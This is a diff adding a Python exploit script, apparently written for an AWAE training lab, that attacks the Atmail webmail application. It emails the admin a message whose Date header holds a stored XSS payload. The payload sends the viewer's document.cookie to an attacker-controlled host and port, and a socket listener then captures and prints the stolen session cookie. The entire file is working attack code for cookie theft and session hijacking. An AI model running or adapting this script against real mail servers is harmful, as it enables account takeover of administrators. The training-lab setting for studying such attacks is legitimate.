@@ -1,0 +1,65 @@
+#!/usr/bin/python3
+# Based on scripts exploit XSS in Atmail module in AWAE
+# Author: donguyen269
+import socket
+import sys,re, requests, subprocess, smtplib
+s = requests.session()
+proxies = {
+    "http":"127.0.0.1:8080",
+    "https":"127.0.0.1:8080"
+}
+def inject_xss(target, lhost, lport):
+    msg  = "From: attacker@offsec.local\n"
+    msg += "To: admin@offsec.local\n"
+    msg += "Date: \"><img src=1 onerror=\"this.src='http://%s:%s/?cookie='+document.cookie\" removeAttribute('onerror')>\n"%(lhost,lport) 
+    msg += "Subject: You haz been pwnd\n"
+    msg += "Content-type: text/html\n\n"
+    msg += "Oh noez, you been had!"
+    msg += '\r\n\r\n'
+    server = smtplib.SMTP("atmail")
+    try:
+       server.sendmail("attacker@offsec.local", "admin@offsec.local", msg)
+       print ("[+] Email sent!")
+    except Exception as e:
+        print ("[-] Failed to send email:")
+        print( "[*] " + str(e) )  
+    server.quit()
+
+def wait_for_stealing_cookie(lport):
+    s = socket.socket()
+    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    lport = int(lport)
+    s.bind(('192.168.119.193',lport))
+    s.listen()
+    s.settimeout(60)
+    
+    print("[*] Waiting for admin to trigger XSS...")
+    (sock_c, ip_c) = s.accept()
+    get_request = sock_c.recv(4096)
+    cookie = re.search(r".*cookie=(.*).HTTP", get_request.decode("utf-8")).group(1)
+    if cookie == None:
+        print("(+) Fail to get cookie!!")
+        sys.exit(-1)
+    else:
+        print("Steal cookie successfully.\nStole cookie: %s" % cookie)
+        s.close()
+        return cookie
+        
+    
+def main():
+    if len(sys.argv) != 4:
+        print("(+) Usage python3 %s <target> <lhost> <lport>" % sys.argv[0])
+        print("(+) i.e: python3 %s atmail 192.168.119.191 8888" % sys.argv[0])
+        sys.exit(-1)
+    
+    target = sys.argv[1]
+    lhost = sys.argv[2]
+    lport = sys.argv[3]
+    print("(+) Trying inject xss payload...")
+    inject_xss(target, lhost, lport)
+    print("(+) Setting up listener on port %s" % lport)
+    wait_for_stealing_cookie(lport)
+    
+    
+if __name__ == "__main__":
+    main()
